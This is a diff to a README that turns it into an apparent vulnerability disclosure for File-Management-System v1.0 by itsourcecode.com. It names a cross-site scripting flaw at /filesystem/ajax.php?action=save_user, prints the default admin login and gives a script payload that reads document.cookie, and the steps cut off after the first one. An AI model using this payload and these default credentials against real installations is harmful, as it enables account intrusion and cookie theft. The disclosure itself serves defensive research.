@@ -1,7 +1,18 @@
-# File-Management-System
-Login Account:admin
+# File-Management-System v1.0 by itsourcecode.com has Cross-site Scripting (XSS)
 
-Password:1
+The password for the backend login account is: admin/1
+
+vendors: https://itsourcecode.com/free-projects/php-project/file-management-system-in-php-with-source-code/
+
+Vulnerability File:  /filesystem/ajax.php
+
+Vulnerability location:  /filesystem/ajax.php?action=save_user HTTP/1.1
+
+[+] Payload: <script>alert(document.cookie)</script>
+
+Tested on Windows 10, phpStudy
+
+There is an example with alert:
 
 Click Users on the left
 
